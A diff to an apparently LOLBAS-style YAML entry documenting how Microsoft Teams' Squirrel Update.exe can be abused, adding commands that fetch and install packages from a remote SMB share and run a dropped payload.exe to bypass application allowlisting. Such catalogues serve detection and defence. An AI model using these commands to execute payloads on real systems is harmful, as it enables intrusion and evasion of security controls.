@@ -12,7 +12,7 @@ Commands:
     MitreID: T1218 
     MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --update [url to package]
+  - Command: Update.exe --update=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: AWL Bypass
@@ -20,7 +20,7 @@ Commands:
     MitreID: T1218
     MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --update [url to package]
+  - Command: Update.exe --update=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: Execute
@@ -28,7 +28,23 @@ Commands:
     MitreID: T1218
     MitreLink: https://attack.mitre.org/techniques/T1218/
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: Update.exe --updateRoolback=[url to package]
+  - Command: Update.exe --update=\\remoteserver\payloadFolder
+    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
+    Usecase: Download and execute binary
+    Category: AWL Bypass
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/techniques/T1218/
+    OperatingSystem: Windows 7 and up with Microsoft Teams installed
+  - Command: Update.exe --update=\\remoteserver\payloadFolder
+    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
+    Usecase: Download and execute binary
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/techniques/T1218/
+    OperatingSystem: Windows 7 and up with Microsoft Teams installed
+  - Command: Update.exe --updateRollback=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: AWL Bypass
@@ -52,6 +68,22 @@ Commands:
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
+  - Command: Update.exe --updateRollback=\\remoteserver\payloadFolder
+    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
+    Usecase: Download and execute binary
+    Category: AWL Bypass
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/techniques/T1218/
+    OperatingSystem: Windows 7 and up with Microsoft Teams installed
+  - Command: Update.exe --updateRollback=\\remoteserver\payloadFolder
+    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.
+    Usecase: Download and execute binary
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/techniques/T1218/
+    OperatingSystem: Windows 7 and up with Microsoft Teams installed
   - Command: Update.exe --processStart payload.exe --process-start-args "whatever args"
     Description: Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.
     Usecase: Execute binary
@@ -70,11 +102,13 @@ Resources:
   - Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
   - Link: https://twitter.com/reegun21/status/1144182772623269889
   - Link: https://twitter.com/MrUn1k0d3r/status/1143928885211537408
+  - Link: https://twitter.com/reegun21/status/1291005287034281990
   - Link: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
   - Link: https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
   - Link: https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
+  - Link: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/
 Acknowledgement:
-  - Person: Reegun J (OCBC Bank)
+  - Person: Reegun Richard Jayapaul (SpiderLabs, Trustwave)
     Handle: '@reegun21'
   - Person: Mr.Un1k0d3r
     Handle: '@MrUn1k0d3r'
